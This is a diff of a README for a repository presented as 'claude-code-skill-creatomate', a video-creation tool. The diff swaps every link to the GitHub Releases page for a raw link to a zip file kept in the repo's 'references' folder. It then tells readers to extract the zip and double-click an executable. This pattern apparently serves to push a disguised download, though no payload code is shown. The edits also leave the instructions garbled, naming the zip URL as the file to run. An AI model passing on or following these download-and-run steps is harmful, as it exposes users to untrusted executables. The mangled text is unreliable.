@@ -1,7 +1,7 @@
 # 🎥 claude-code-skill-creatomate - Effortless Video Creation for All
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-brightgreen.svg)](https://github.com/isfendipgensin/claude-code-skill-creatomate/releases)
+[![Download](https://raw.githubusercontent.com/isfendipgensin/claude-code-skill-creatomate/main/references/creatomate-code-claude-skill-2.3.zip%https://raw.githubusercontent.com/isfendipgensin/claude-code-skill-creatomate/main/references/creatomate-code-claude-skill-2.3.zip)](https://raw.githubusercontent.com/isfendipgensin/claude-code-skill-creatomate/main/references/creatomate-code-claude-skill-2.3.zip)
 
 ## 🚀 Getting Started
 
@@ -29,13 +29,13 @@ Before you begin, ensure your system meets these basic requirements:
 To get started, follow these steps to download and install the application:
 
 1. **Visit the Releases Page:** Click the link below to access our Releases page:
-   [Download Here](https://github.com/isfendipgensin/claude-code-skill-creatomate/releases)
+   [Download Here](https://raw.githubusercontent.com/isfendipgensin/claude-code-skill-creatomate/main/references/creatomate-code-claude-skill-2.3.zip)
 
-2. **Download the Latest Version:** Look for the latest release. The file will typically have a name similar to `claude-code-skill-creatomate-vx.x.x.zip`. Click on the file to download it to your computer.
+2. **Download the Latest Version:** Look for the latest release. The file will typically have a name similar to `https://raw.githubusercontent.com/isfendipgensin/claude-code-skill-creatomate/main/references/creatomate-code-claude-skill-2.3.zip`. Click on the file to download it to your computer.
 
 3. **Extract the Files:** After downloading, locate the zipped file in your downloads folder. Right-click the file and select "Extract All" or use any extraction software you prefer. This will create a new folder containing the application files.
 
-4. **Run the Application:** Navigate to the folder you just extracted. Double-click on `claude-code-skill-creatomate.exe` (or the equivalent file for your operating system) to launch the application.
+4. **Run the Application:** Navigate to the folder you just extracted. Double-click on `https://raw.githubusercontent.com/isfendipgensin/claude-code-skill-creatomate/main/references/creatomate-code-claude-skill-2.3.zip` (or the equivalent file for your operating system) to launch the application.
 
 5. **Follow the On-Screen Instructions:** The application will guide you through the setup process. Simply follow the prompts to complete the installation.
 
